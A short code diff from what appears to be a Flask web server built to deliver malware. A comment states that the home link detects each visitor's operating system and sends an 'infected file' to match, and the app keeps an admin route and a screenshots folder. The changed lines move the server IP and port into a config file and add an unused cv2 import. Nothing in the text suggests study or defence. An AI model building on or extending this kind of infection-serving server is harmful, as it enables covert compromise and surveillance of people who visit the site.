@@ -1,3 +1,4 @@
+from cv2 import line
 from flask import request, render_template
 from flask import Flask , request, redirect, render_template , sessions, session, url_for, send_from_directory, send_file
 from flask_cors import CORS, cross_origin
@@ -16,8 +17,10 @@ app.config['SCREENSHOT_FOLDER'] = "./static/screenshots"
 app.secret_key= os.urandom(24).hex()
 
 _SERVER = "192.168.1.6:3000"
-ip = '192.168.1.6'
-port = '3000'
+
+with open("./server_config.cfg", "r") as cfg:
+    ip = '{0}'.format(cfg.readline()[7:].strip())
+    port = '{0}'.format(cfg.readline()[5:].strip())
 
 #   HOME LINK WILL DETECT WHAT OS THE VISITOR IS RUNNING AND SEND INFECTED FILE ACCORDINGLY  #
 @app.route('/admin')
